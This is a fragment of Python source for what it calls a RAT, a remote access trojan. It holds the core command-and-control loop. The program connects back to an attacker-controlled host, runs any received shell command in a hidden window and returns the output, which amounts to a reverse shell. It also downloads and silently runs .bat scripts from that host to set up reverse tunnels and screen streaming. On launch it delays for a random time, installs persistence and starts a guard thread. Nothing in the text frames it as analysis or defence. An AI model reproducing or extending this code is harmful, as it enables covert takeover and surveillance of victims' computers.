                                     daemon=True, name="s2-" + target_id)
        _S2["th"].start()
    p = STREAM2_PORT_BASE + int(target_id)
    # best-effort: auto-start the reverse tunnel like deploy_vnc does; if the
    # bat cannot be fetched the streamer still works (tunnel can be added later)
    tunnel_note = ""
    try:
        root = _base_dir()
        if root:
            err = _run_hidden(
                os.path.join(root, "stream2"),
                "stream2_target_setup.bat",
                f"http://{LHOST}:8000/stream2_target_setup.bat",
                target_id,
            )
            if err:
                tunnel_note = " | tunnel: NOT auto-started (%s)" % err
    except Exception as e:
        tunnel_note = " | tunnel: NOT auto-started (%s)" % e
    return ("[+] stream2 started (id %s)%s\n"
            "    local:  tcp://127.0.0.1:%d\n"
            "    VPS:    127.0.0.1:%d (needs reverse tunnel, like VNC)\n"
            "    play:   vlc tcp://<tunnel-end>:<port>\n"
            % (target_id, tunnel_note, p, p)).encode() + MARKER


def stop_stream2(cmd: str) -> bytes:
    """'stop stream2 [id]': stop the python-native stream thread."""
    with _S2["lock"]:
        th = _S2["th"]
        if not th or not th.is_alive():
            return b"[*] stream2 not running\n" + MARKER
        _S2["stop"].set()
    th.join(timeout=8)
    with _S2["lock"]:
        _S2["th"] = None
    # best-effort: tear down the reverse tunnel + autostart on the target
    try:
        root = _base_dir()
        if root:
            _run_hidden(
                os.path.join(root, "stream2"),
                "stream2_target_stop.bat",
                f"http://{LHOST}:8000/stream2_target_stop.bat",
                str(_S2["info"].get("id") or 1),
            )
    except Exception:
        pass
    return b"[+] stream2 stopped\n" + MARKER


def stream2_status() -> bytes:
    """'stream2 status': report streamer state."""
    with _S2["lock"]:
        th = _S2["th"]
        info = dict(_S2["info"])
    if not th or not th.is_alive():
        st = info.get("state")
        if st and st.startswith("failed"):
            return ("[*] stream2: not running (last error: %s)\n" % st).encode() + MARKER
        return b"[*] stream2: not running\n" + MARKER
    lines = ["[*] stream2: id=%s state=%s" % (info.get("id", "?"),
                                               info.get("state", "?"))]
    lines.append("    encoder:  %s" % info.get("encoder", "?"))
    lines.append("    video:    %sx%s @ %s fps%s" % (
        info.get("w"), info.get("h"), info.get("fps"),
        " (degraded)" if info.get("degraded") else ""))
    lines.append("    viewer:   %s" % ("CONNECTED" if info.get("viewers")
                                       else "waiting"))
    lines.append("    uptime:   %ds   bytes: %s" % (
        int(time.time() - info.get("started", time.time())),
        info.get("bytes", 0)))
    lines.append("    stream:   tcp://127.0.0.1:%s" % info.get("port", "?"))
    return ("\n".join(lines) + "\n").encode() + MARKER


def execute_command(cmd: str) -> bytes:
    """Run a shell command and return its output. Handles cd persistently."""
    # Handle cd internally so the working directory persists between commands
    if cmd.lower() == "cd" or cmd.lower().startswith("cd "):
        try:
            path = cmd[2:].strip() or os.path.expanduser("~")
            path = os.path.expandvars(path)
            os.chdir(path)
            return f"{os.getcwd()}\n".encode() + MARKER
        except Exception as e:
            return f"[!] {e}\n".encode() + MARKER

    try:
        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            timeout=30,
            creationflags=subprocess.CREATE_NO_WINDOW if os.name == "nt" else 0,
        )
        output = result.stdout + result.stderr
    except subprocess.TimeoutExpired:
        output = b"[!] Command timed out."
    except Exception as e:
        output = f"[!] Error: {e}".encode()

    if os.name == "nt":
        try:
            output = output.decode("cp1252", errors="replace").encode("utf-8")
        except Exception:
            pass

    return output + MARKER


def connect() -> None:
    """Main loop - connect, execute commands, reconnect on failure."""
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((LHOST, LPORT))
        except (ConnectionRefusedError, OSError):
            time.sleep(RECONNECT_DELAY)
            continue

        try:
            while True:
                data = sock.recv(BUFFER)
                if not data:
                    break

                cmd = data.decode("utf-8", errors="replace").strip()
                if not cmd:
                    continue

                low = cmd.lower()
                if low == "stream2 status" or low == "s2status":
                    output = stream2_status()
                elif (low == "stop stream2" or low.startswith("stop stream2 ")
                        or low == "stopstream2" or low.startswith("stopstream2 ")):
                    output = stop_stream2(cmd)
                elif low == "stream2" or low.startswith("stream2 "):
                    output = deploy_stream2(cmd)
                elif (low == "streams" or low.startswith("streams ")
                        or low == "list streams" or low.startswith("list streams ")):
                    output = vnc_status()
                elif (low == "stop stream" or low.startswith("stop stream ")
                        or low == "stopstream" or low.startswith("stopstream ")):
                    output = stop_vnc(cmd)
                elif low == "stream" or low.startswith("stream "):
                    output = deploy_vnc(cmd)
                else:
                    output = execute_command(cmd)
                sock.sendall(output)
        except (ConnectionResetError, OSError):
            pass
        finally:
            try:
                sock.close()
            except OSError:
                pass

        time.sleep(RECONNECT_DELAY)


if __name__ == "__main__":
    try:
        lo, hi = PRE_CONNECT_SLEEP
        if hi > 0 and os.environ.get("RAT_FAST") != "1":
            time.sleep(random.uniform(lo, hi))
    except Exception:
        pass
    # Source mode (loader_py v3, RAT_SOURCE=1): the loader owns persistence
    # and feeds this script via stdin - skip self-install entirely.
    if os.environ.get("RAT_SOURCE") != "1":
        install_persistence()   # install + verified handoff on first run
        threading.Thread(target=_persistence_guard, daemon=True,
                         name=f"guard-{BUILD_ID[:8]}").start()
    connect()